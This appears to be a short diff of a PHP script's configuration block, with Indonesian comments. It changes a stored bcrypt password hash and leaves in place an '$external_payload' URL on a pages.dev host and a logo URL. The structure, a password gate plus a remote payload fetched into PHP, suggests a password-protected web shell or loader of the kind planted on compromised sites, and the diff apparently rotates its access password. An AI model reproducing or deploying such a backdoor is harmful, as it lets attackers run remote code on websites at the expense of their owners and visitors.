@@ -4,7 +4,7 @@ session_start();
 /**
  * KONFIGURASI
  */
-$valid_password_hash = '$2a$12$7lG71jCAYYcH.uMJ49zyM.l4OC.a/sTKMGQh4gX1JduLMvAvzaAoG'; 
+$valid_password_hash = '$2a$12$1ZNmMjwVGvkz.fREMN5UWer33AfZDgAHSXKVv6D6hfuvJivG9AJNu'; 
 $external_payload = 'https://wakwak90.pages.dev/1.txt';
 $logo_url = 'https://g.top4top.io/p_36674k04q0.png';
 
